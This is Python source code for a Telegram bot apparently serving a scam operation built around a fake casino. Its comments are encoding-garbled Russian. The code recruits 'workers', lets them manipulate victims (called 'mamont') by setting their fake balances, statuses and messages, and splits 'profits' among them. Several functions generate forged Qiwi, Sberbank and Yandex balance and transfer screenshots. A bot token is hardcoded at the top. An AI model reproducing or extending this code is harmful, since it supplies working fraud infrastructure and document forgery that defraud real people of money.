import telebot
from telebot import types
from telebot.types import InputMediaPhoto

from time import sleep

import function
from function import plural_profit, convert_date, create_phone, share_pay

import datetime, threading, database, keyboard, configparser
from datetime import timedelta

from PIL import Image, ImageFont, ImageDraw

bot = telebot.TeleBot('5974796623:AAHeZNXngEgJZ8KnfIc7m8L7m59hvmciYKE') # –¢–æ–∫–µ–Ω –≤–æ—Ä–∫–µ—Ä –±–æ—Ç–∞
db = database

config = configparser.ConfigParser()
config.read("default.ini")

# –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ

admin = [5348342250,5890166089] # ID –ê–¥–º–∏–Ω–æ–≤
chat_channel = -100185041413 # ID –ö–∞–Ω–∞–ª–∞ —Å –∑–∞–ª–µ—Ç–∞–º–∏ 
id_bot = 5974796623 # ID Worker –±–æ—Ç–∞
casino = 'blackspaysbot' # Username Casino –±–æ—Ç–∞
url_info_channel = 'https://t.me/leamokal' # –°—Å—ã–ª–∫–∞ –Ω–∞ –∏–Ω—Ñ–æ –∫–∞–Ω–∞–ª
url_payments_channel = 'https://t.me/leamokal' # –°—Å—ã–ª–∫–∞ –Ω–∞ –∫–∞–Ω–∞–ª –∑–∞–ª–µ—Ç–æ–≤
date_open = '–¥–∞–≤–Ω–æ' # –¥–∞—Ç–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è –ø—Ä–æ–µ–∫—Ç–∞
date_open_cc = '–¥–∞–≤–Ω–æ' # –¥–∞—Ç–∞ —Å —É–∫–∞–∑–∞–Ω–Ω—ã–º –º–µ—Å—è—Ü–µ–º —Ü–∏—Ñ—Ä–æ–π 
url_admin = '@ektreppro' # username –¢–°–∞ (–º–æ–∂–Ω–æ —á–µ—Ä–µ–∑ ',' –Ω–µ—Å–∫–æ–ª—å–∫–æ)


# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ INI

pay  = config['Telegram']['pay'] # –û–ø–ª–∞—Ç–∞ –ø—Ä–æ—Å—Ç–æ–π –∑–∞–ª–µ—Ç
pay_support = config['Telegram']['pay_support'] # –û–ø–ª–∞—Ç–∞ —á–µ—Ä–µ–∑ –¢–ü
status = config['Telegram']['messages'] # –°—Ç–∞—Ç—É—Å —Ä–∞–±–æ—Ç—ã –∫–∞–∑–∏–Ω–æ (–∑–∞–ø–æ–ª–Ω—è—Ç—å –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)
chat = config['Telegram']['chat'] # –°—Å—ã–ª–∫–∞ –Ω–∞ —á–∞—Ç-–ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ
phone = config['Telegram']['phone'] # –ù–æ–º–µ—Ä QIWI
token = config['Telegram']['token'] # –¢–æ–∫–µ–Ω QIWI

banned = ['–ù–∞–∑–∞–¥']

# –ü—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏–µ –∞–Ω–∫–µ—Ç—ã

user_dict = {}
class User:
    def __init__(self, infinitive):

        keys = ['url', 'experience', 'time']
        
        for key in keys:
            self.key = None

def answer_from(message):
	try:
		chat_id = message.chat.id

		user_dict[chat_id] = User(chat_id)
		user = user_dict[chat_id]
		user.url = message.text

		message = bot.send_message(chat_id, 'üçÄ –ò–º–µ–µ—Ç—Å—è –ª–∏ —É –í–∞—Å <b>–æ–ø—ã—Ç —Ä–∞–±–æ—Ç—ã</b> –≤ –¥–∞–Ω–Ω–æ–π —Å—Ñ–µ—Ä–µ? –ï—Å–ª–∏ –¥–∞, —Ç–æ –∫–∞–∫–æ–π? –î–µ–ª–∞–ª–∏ –ª–∏ –≤—ã –ø—Ä–æ—Ñ–∏—Ç—ã –∏ —É –∫–æ–≥–æ —Ä–∞–±–æ—Ç–∞–ª–∏?', parse_mode = 'html')
		bot.register_next_step_handler(message, answer_experience)

	except Exception as e:
		print(e)

def answer_experience(message):
	try:
		chat_id = message.chat.id

		user = user_dict[chat_id]
		user.experience = message.text

		message = bot.send_message(chat_id, 'üçÄ –°–∫–æ–ª—å–∫–æ –≤—Ä–µ–º–µ–Ω–∏ –í—ã <b>–≥–æ—Ç–æ–≤—ã —É–¥–µ–ª—è—Ç—å —Ä–∞–±–æ—Ç–µ</b> –∏ –∫–∞–∫–æ–≥–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞ –≤—ã —Ö–æ—Ç–∏—Ç–µ –¥–æ–±–∏—Ç—å—Å—è?', parse_mode = 'html')
		bot.register_next_step_handler(message, answer_time)

	except:
		pass

def answer_time(message):
	try:
		chat_id = message.chat.id

		user = user_dict[chat_id]
		user.time = message.text

		inline_keyboard = types.InlineKeyboardMarkup(row_width = 2)
		inline_1 = types.InlineKeyboardButton(text = "‚úÖ –ü—Ä–∏–Ω—è—Ç—å", callback_data = f'ACCEPT_{chat_id}')
		inline_2 = types.InlineKeyboardButton(text = "üö´ –û—Ç–∫–ª–æ–Ω–∏—Ç—å", callback_data = f'CANCEL_{chat_id}')
		inline_3 = types.InlineKeyboardButton(text = "–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å", callback_data = f'BAN_{chat_id}')
		inline_keyboard.add(inline_1, inline_2, inline_3)

		if message.from_user.username is not None:
			bot.send_message(admin[0], f'üíå –ù–æ–≤–∞—è <b>–∑–∞—è–≤–∫–∞</b>!\n\nüë®‚Äçüíª –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{message.from_user.username}\n–û—Ç–∫—É–¥–∞ —É–∑–Ω–∞–ª–∏: {user.url}\n–û–ø—ã—Ç –≤ —Ä–∞–±–æ—Ç–µ: {user.experience}'
				+ f'\n–í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã: {user.time}', parse_mode = 'html', reply_markup = inline_keyboard)
		else:
			bot.send_message(admin[0], f'üíå –ù–æ–≤–∞—è <b>–∑–∞—è–≤–∫–∞</b>!\n\nüë®‚Äçüíª –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: —Å–∫—Ä—ã—Ç\n–û—Ç–∫—É–¥–∞ —É–∑–Ω–∞–ª–∏: {user.url}\n–û–ø—ã—Ç –≤ —Ä–∞–±–æ—Ç–µ: {user.experience}'
				+ f'\n–í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã: {user.time}', parse_mode = 'html', reply_markup = inline_keyboard)


		db.workers_update_thread(chat_id, 1)
		bot.send_message(chat_id, '‚ú® –í–∞—à–∞ –∑–∞—è–≤–∫–∞ –±—ã–ª–∞ <b>–æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞</b>', parse_mode = 'html')

	except:
		pass		

# –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –Ω–∏–∫–Ω–µ–π–º–∞

def no_hide_nickname(message):
	try:

		if message.from_user.id != id_bot:

			if message.from_user.username is not None:
				db.workers_update_username(message.chat.id, f'@{message.from_user.username}')
			elif message.from_user.user_name is not None:
				db.workers_update_username(message.chat.id, message.from_user.user_name)

	except Exception as e:
		print(e)
	
# –í—ã–≤–æ–¥ –≤–æ—Ä–∫–µ—Ä–∞–º

def workers_receive(message, balance):
	try:
		chat_id = message.chat.id

		db.balance_to_receive(chat_id, balance)

		inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
		inline_1 = types.InlineKeyboardButton(text = "‚úÖ –í—ã–ø–ª–∞—Ç–∏—Ç—å", callback_data = f'RECEIVE_{chat_id}')
		inline_keyboard.add(inline_1)

		bot.send_message(admin[0], f'üì® –í–æ—Ä–∫–µ—Ä –ø–æ–¥–∞–ª –∑–∞—è–≤–∫—É –Ω–∞ <b>–≤—ã–≤–æ–¥</b>\n\n–†–µ–∫–≤–∏–∑–∏—Ç—ã: <b>{message.text}</b>\n–°—É–º–º–∞ –≤—ã–≤–æ–¥–∞: <b>{balance}</b> ‚ÇΩ', parse_mode = 'html', reply_markup = inline_keyboard)

		receive = db.workers_receive(chat_id)
		bot.send_message(chat_id, f'üì® –ó–∞—è–≤–∫–∞ –Ω–∞ <b>–≤—ã–≤–æ–¥</b> –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –¢–°—É\n–ù–∞ –≤—ã–≤–æ–¥–µ: <b>{receive}</b> ‚ÇΩ', parse_mode = 'html')
	except Exception as e:
		raise e

# –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∏ —Ñ—É–Ω–∫—Ü–∏–∏ —Å–≤—è–∑–∞–Ω–Ω—ã–µ —Å –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ–º –¥—Ä—É–æ–≥–æ –±–æ—Ç–∞

def accept_receive(mamont_id):
	try:
			
		function.to_accept_receive(mamont_id)

	except Exception as e:
		print(e)

def message_to_mamont(message, mamont_id, sended_message):
	try:
		
		mamont_code = db.casino_code(mamont_id)
		worker_code = db.workers_code(message.chat.id)
		status = db.workers_status(message.chat.id)


		if (mamont_code == worker_code) or (status == '–°–∞–ø–ø–æ—Ä—Ç'):
			function.message_to_mamont(mamont_id, sended_message)
			bot.send_message(message.chat.id, 'MSG - –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ')
		else:
			bot.send_message(message.chat.id, '‚ö†Ô∏è –≠—Ç–æ <b>–Ω–µ –≤–∞—à</b> –º–∞–º–æ–Ω—Ç –∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å <b>–Ω–µ –Ω–∞–π–¥–µ–Ω</b>',
				parse_mode = 'html')

	except Exception as e:
		print(e)

# –°–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–æ–º–æ

def create_promo(message, promo):
	try:

		md = function.create_promo(10)
		db.promo_add(md, promo)

		bot.send_message(message.chat.id, f'–ü—Ä–æ–º–æ–∫–æ–¥ <code>{md}</code> —Å–æ–∑–¥–∞–Ω –Ω–∞ —Å—É–º–º—É {promo} ‚ÇΩ',
			parse_mode = 'html')

	except Exception as e:
		raise e

# –í–æ—Ä–∫–µ—Ä —Ñ—É–Ω–∫—Ü–∏–∏

def show_mamont_info(message, mamont_id):
	try:
		

		mamont_code = db.casino_code(mamont_id)
		worker_code = db.workers_code(message.chat.id)
		status = db.workers_status(message.chat.id)

		if (mamont_code == worker_code) or (status == '–°–∞–ø–ø–æ—Ä—Ç'):

			username = db.casino_username(mamont_id)
			balance = db.casino_balance(mamont_id)
			status = db.casino_status(mamont_id)
			workers_username = db.workers_code_to_username(mamont_code)

			bot.send_message(message.chat.id, f'üíÅüèª‚Äç‚ôÄÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ <b>{mamont_id}</b>\n\n–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {username}\n–ë–∞–ª–∞–Ω—Å: {balance} ‚ÇΩ\n–°—Ç–∞—Ç—É—Å: {status}\n–ó–∞–ø–∏—Å–∞–Ω –∑–∞: {workers_username}', parse_mode = 'html')

		else:
			bot.send_message(message.chat.id, '‚ö†Ô∏è –≠—Ç–æ <b>–Ω–µ –≤–∞—à</b> –º–∞–º–æ–Ω—Ç –∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å <b>–Ω–µ –Ω–∞–π–¥–µ–Ω</b>',
				parse_mode = 'html')

	except Exception as e:
		print(e)

def set_balance(message, mamont_id, value):
	try:

		mamont_code = db.casino_code(mamont_id)
		worker_code = db.workers_code(message.chat.id)
		status = db.workers_status(message.chat.id)

		if (mamont_code == worker_code) or (status == '–°–∞–ø–ø–æ—Ä—Ç'):

			db.casino_update_balance(mamont_id, value)
			balance = db.casino_balance(mamont_id)

			bot.send_message(message.chat.id, f'–ë–∞–ª–∞–Ω—Å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω\n–ù–æ–≤—ã–π –±–∞–ª–∞–Ω—Å: <b>{balance}</b> ‚ÇΩ', parse_mode = 'html')
		else:
			bot.send_message(message.chat.id, '‚ö†Ô∏è –≠—Ç–æ <b>–Ω–µ –≤–∞—à</b> –º–∞–º–æ–Ω—Ç –∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å <b>–Ω–µ –Ω–∞–π–¥–µ–Ω</b>',
				parse_mode = 'html')
	except Exception as e:
		print(e)

def delete_mamont(message, mamont_id):
	try:
		

		mamont_code = db.casino_code(mamont_id)
		worker_code = db.workers_code(message.chat.id)
		status = db.workers_status(message.chat.id)

		if (mamont_code == worker_code) or (status == '–°–∞–ø–ø–æ—Ä—Ç'):

			username = db.casino_username(mamont_id)
			db.casino_remove_mamont(mamont_id)

			bot.send_message(message.chat.id, f'–ú–∞–º–æ–Ω—Ç {mamont_id} ({username}) <b>–±—ã–ª —É–¥–∞–ª–µ–Ω</b>', parse_mode = 'html')
		else:
			bot.send_message(message.chat.id, '‚ö†Ô∏è –≠—Ç–æ <b>–Ω–µ –≤–∞—à</b> –º–∞–º–æ–Ω—Ç –∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å <b>–Ω–µ –Ω–∞–π–¥–µ–Ω</b>',
				parse_mode = 'html')


	except Exception as e:
		print(e)

def set_status(message, mamont_id, mamont_status):
	try:
		array = [1, 2, 3]

		mamont_code = db.casino_code(mamont_id)
		worker_code = db.workers_code(message.chat.id)
		status = db.workers_status(message.chat.id)

		if (mamont_code == worker_code) or (status == '–°–∞–ø–ø–æ—Ä—Ç'):

			mamont_status = int(mamont_status)
			if mamont_status in array:

				db.casino_update_status(mamont_id, mamont_status)
				mamont_status = db.casino_status(mamont_id)

				bot.send_message(message.chat.id, f'–°—Ç–∞—Ç—É—Å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω\n–ù–æ–≤—ã–π –°—Ç–∞—Ç—É—Å: <b>{mamont_status}</b>', parse_mode = 'html')

			else:
				bot.send_message(message.chat.id, '‚ö†Ô∏è –°—Ç–∞—Ç—É—Å –æ—Ç <b>1</b> –¥–æ <b>3</b>',
					parse_mode = 'html')

		else:
			bot.send_message(message.chat.id, '‚ö†Ô∏è –≠—Ç–æ <b>–Ω–µ –≤–∞—à</b> –º–∞–º–æ–Ω—Ç –∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å <b>–Ω–µ –Ω–∞–π–¥–µ–Ω</b>',
				parse_mode = 'html')


	except Exception as e:
		print(e)		



# –ê–¥–º–∏–Ω —Ñ—É–Ω–∫—Ü–∏–∏

def payment_handler(message):
	try:
		chat_id = message.chat.id
		array = message.text.split(' ')

		db.workers_add_profit(array[0], array[1])

		share = share_pay(float(array[1]))
		code = db.workers_code(array[0])
		usernames = db.workers_code_to_username(code)


		bot.send_message(array[0], f'üíû –£—Å–ø–µ—à–Ω–∞—è <b>–æ–ø–ª–∞—Ç–∞</b>\n–¢–≤–æ—è –¥–æ–ª—è ~ <b>{share}</b> ‚ÇΩ\n\nüí∏ –°—É–º–º–∞ –ø–ª–∞—Ç–µ–∂–∞: <b>{array[1]}</b> ‚ÇΩ', parse_mode = 'html')
		bot.send_message(chat_channel, f'üíû –£—Å–ø–µ—à–Ω–∞—è <b>–æ–ø–ª–∞—Ç–∞</b> (—Ä—É—á–∫–∞)\n–î–æ–ª—è –≤–æ—Ä–∫–µ—Ä–∞ ~ <b>{share}</b> ‚ÇΩ\n\nüë®‚Äçüíª –í–æ—Ä–∫–µ—Ä: {usernames}\nüí∏ –°—É–º–º–∞ –ø–ª–∞—Ç–µ–∂–∞: <b>{array[1]}</b> ‚ÇΩ', parse_mode = 'html')
	except:
		pass


def url_chat(message):
	try:
		


		config = configparser.ConfigParser()

		config.read('default.ini')

		config['Telegram']['chat'] = message.text

		with open('default.ini', 'w') as configfile:
			config.write(configfile)

		global chat
		config.read("default.ini")
		chat = config['Telegram']['chat']

		bot.send_message(message.chat.id, '–ì–æ—Ç–æ–≤–æ')

	except:
		pass

def set_wallet(message):
	try:
		
		array = message.text.split(':')

		config = configparser.ConfigParser()

		config.read('default.ini')

		config['Telegram']['phone'] = array[0]
		config['Telegram']['token'] = array[1]

		with open('default.ini', 'w') as configfile:
			config.write(configfile)

		global phone, token

		config.read("default.ini")
		phone = config['Telegram']['phone']
		token = config['Telegram']['token']

		bot.send_message(message.chat.id, '–ì–æ—Ç–æ–≤–æ')

	except:
		pass


def set_status_work(message):
	try:
		


		config = configparser.ConfigParser()

		config.read('default.ini')

		config['Telegram']['messages'] = message.text

		with open('default.ini', 'w') as configfile:
			config.write(configfile)

		global status
		config.read("default.ini")
		status = config['Telegram']['messages']

		bot.send_message(message.chat.id, '–ì–æ—Ç–æ–≤–æ')

	except:
		pass



def set_support(message):
	try:
		

		db.workers_add_support(chat_id)
		bot.send_message(message.chat.id, '–ì–æ—Ç–æ–≤–æ')


	except:
		pass


def unset_support(message):
	try:
		

		db.workers_add_unsetsupport(chat_id)
		bot.send_message(message.chat.id, '–ì–æ—Ç–æ–≤–æ')


	except:
		pass


def fake_qiwi_balance(message):
	try:

		if (message.text not in banned):
			text = message.text + ' ‚ÇΩ'
			qiwi = Image.open("Image source/Qiwi/qiwi_balance.png")
			fnt = ImageFont.truetype("Fonts/Roboto-Bold.ttf", 100)
			W = 1080
			w, h = fnt.getsize(text)
			d = ImageDraw.Draw(qiwi)
			d.text(((W - w) / 2, 296), text, font=fnt, fill=(255, 255, 255, 255))
			del d
			qiwi.save("Image cache/file_qiwi.png", "PNG")
			img = open('Image cache/file_qiwi.png', 'rb')

			bot.send_photo(message.chat.id, img)
			
		else:
			bot.send_message(message.chat.id, 'üë®‚Äçüíº –í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ <b>–≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é</b>', parse_mode="html", reply_markup=keyboard.main_keyboard())

	except Exception as e:
		print(e)

def fake_qiwi_transfer(message):
	try:

		if (message.text not in banned):
			text = message.text.split('\n')
			money = text[0] + " ‚ÇΩ"
			money2 = "- " + text[0].strip() + " ‚ÇΩ"
			phone = text[1].strip()
			date_time = text[2].strip()
			qiwi = Image.open('Image source/Qiwi/qiwi_check.png')
			font1 = ImageFont.truetype('Fonts/Roboto-Bold.ttf', 53)
			font2 = ImageFont.truetype('Fonts/Roboto-Regular.ttf', 38)
			font3 = ImageFont.truetype('Fonts/Roboto-Regular.ttf', 45)
			font4 = ImageFont.truetype('Fonts/Roboto-Bold.ttf', 45)
			W = 1080
			w1, h1 = font1.getsize(money2)
			w2, h2 = font1.getsize(phone)
			d = ImageDraw.Draw(qiwi)
			d.text(((W-w1)/2,685), money2, font=font1, fill=(0,0,0,255))
			d.text(((W-w2)/2 + 60,614), phone, font=font2, fill=(153,153,153,255))
			d.text((56,1890), date_time, font=font3, fill=(0,0,0,255))
			d.text((56,2072), money, font=font4, fill=(0,0,0,255))
			qiwi.save("Image cache/file_qiwi_1.png", "PNG")
			img = open('Image cache/file_qiwi_1.png', 'rb')
			bot.send_photo(message.chat.id, img)
			
		else:
			bot.send_message(message.chat.id, 'üë®‚Äçüíº –í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ <b>–≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é</b>', parse_mode="html", reply_markup=keyboard.main_keyboard())

	except Exception as e:
		print(e)	

def fake_qiwi_get_pc(message):
    try:
        if (message.text not in banned):

        	text = message.text.split('\n')

        	phone = text[0]
        	money = text[1] + ' ‚ÇΩ'
        	name = text[2]
        	payment = Comissions(float(text[3]) - float(text[4])).replace('.', ',')
        	comission = text[4]
        	date = text[5]
        	phone1 = phone.replace(' ', '').replace('‚Äë', '')

        	tink = Image.open('Image source/Qiwi/qiwi_check_pc.png')
        	font1 = ImageFont.truetype('Fonts/Roboto-Bold.ttf', 20)
        	font2 = ImageFont.truetype('Fonts/Roboto-Regular.ttf', 14)
        	font3 = ImageFont.truetype('Fonts/MuseoSans-300.ttf', 21)
        	font4 = ImageFont.truetype('Fonts/MuseoSans-300.ttf', 29)
        	font5 = ImageFont.truetype('Fonts/MuseoSans-300.ttf', 16)
        	font6 = ImageFont.truetype('Fonts/Roboto-Regular.ttf', 15)
        	font7 = ImageFont.truetype('Fonts/MuseoSans-500.ttf', 16)

        	d = ImageDraw.Draw(tink)

        	d.text((1404,20), phone, font=font2, fill=(153,153,153,255))
        	d.text((1404,40), money, font=font1, fill=(0,0,0,255))
        	d.text((497,494), name, font=font3, fill=(0,0,0,255))

        	d.text((677,553), payment, font=font5, fill=(0,0,0,255))
        	d.text((677,583), comission, font=font5, fill=(0,0,0,255))
        	d.text((677,613), payment, font=font7, fill=(0,0,0,255))
        	d.text((677,708), date, font=font5, fill=(0,0,0,255))
        	d.text((677,770), phone1, font=font5, fill=(0,0,0,255))

        	W = 1903
        	w, h = font4.getsize(payment)
        	w1, h1 = font5.getsize(payment)
        	w2, h2 = font5.getsize(comission)
        	w3, h3 = font7.getsize(payment)

        	d.text(((W - w - 810), 489), payment, font=font4, fill='#4bbd5c')
        	d.text(((677 + w1 + 7), 555), '‚ÇΩ', font=font6, fill='#000')
        	d.text(((677 + w2 + 7), 585), '‚ÇΩ', font=font6, fill='#000')
        	d.text(((677 + w3 + 7), 615), '‚ÇΩ', font=font6, fill='#000')

        	tink.save("Image cache/file_qiwi_check_pc.png", "PNG")
        	img = open('Image cache/file_qiwi_check_pc.png', 'rb')
        	bot.send_photo(message.chat.id, img)
        	
        else:
        	bot.send_message(message.chat.id, 'üë®‚Äçüíº –í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ <b>–≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é</b>', parse_mode="html", reply_markup=keyboard.main_keyboard())
    except Exception as e:
        print(e)

def fake_sber_balance(message):
    try:
        if (message.text not in banned):
            text = message.text.split("\n")
            time = text[0]
            name = text[1] + " ‚ÇΩ"
            money = text[2]
            tink = Image.open('Image source/Sber/sber_balance.png')
            font_time = ImageFont.truetype('Fonts/Roboto-Bold.ttf', 16)
            font_name = ImageFont.truetype('Fonts/Roboto-Bold.ttf', 24)
            font_money = ImageFont.truetype('Fonts/Roboto-Bold.ttf', 18)
            d = ImageDraw.Draw(tink)
            d.text((15,20), time, font=font_time, fill=(225, 238, 229,255))

            if (len(text[1]) == 4):
                d.text((490,543), name, font=font_name, fill=(37,152,97,255))
            elif (len(text[1]) <= 3):
                d.text((500,543), name, font=font_name, fill=(37,152,97,255))
            elif (len(text[1]) == 5):
                d.text((480,543), name, font=font_name, fill=(37,152,97,255))
            elif (len(text[1]) == 6):
                d.text((455,543), name, font=font_name, fill=(37,152,97,255))
            elif (len(text[1]) == 7):
            	d.text((430,543), name, font=font_name, fill=(37,152,97,255))
            elif (len(text[1]) == 8):
            	d.text((400,543), name, font=font_name, fill=(37,152,97,255))
            elif (len(text[1]) == 9):
            	d.text((370,543), name, font=font_name, fill=(37,152,97,255))	

            d.text((115, 580), money, font=font_money, fill=(132,132,132,255))
            tink.save("Image cache/file_sber.png", "PNG")
            img = open('Image cache/file_sber.png', 'rb')
            bot.send_photo(message.chat.id, img)
            
        else:
        	bot.send_message(message.chat.id, 'üë®‚Äçüíº –í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ <b>–≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é</b>', parse_mode="html", reply_markup=keyboard.main_keyboard())
    except Exception as e:
        print(e)
def fake_yandex_balance(message):
    try:
        if (message.text not in banned):
            text = message.text.split("\n")
            time = text[0]
            name = text[1]
            money = text[2]
            tink = Image.open('Image source/Yandex/ya_balance.png')
            font_money = ImageFont.truetype('Fonts/ArialRegular.ttf', 96)
            font_name = ImageFont.truetype('Fonts/ArialRegular.ttf', 30)
            font_time = ImageFont.truetype('Fonts/Roboto-Medium.ttf', 21)
            d = ImageDraw.Draw(tink)

            d.text((330,9), time, font=font_time, fill=(255,255,255,255))
            d.text((140,90), name, font=font_name, fill=(255,255,255,255))  
            d.text((50,380), money, font=font_money, fill=(255,255,255,255))

            tink.save("Image cache/file_yandex.png", "PNG")
            img = open('Image cache/file_yandex.png', 'rb')
            bot.send_photo(message.chat.id, img)
            
        else:
            bot.send_message(message.chat.id, 'üë®‚Äçüíº –í—ã –≤–µ—Ä–Ω—É–ª–∏—Å—å –≤ <b>–≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é</b>', parse_mode="html", reply_markup=keyboard.main_keyboard())
    except Exception as e:
        print(e)		
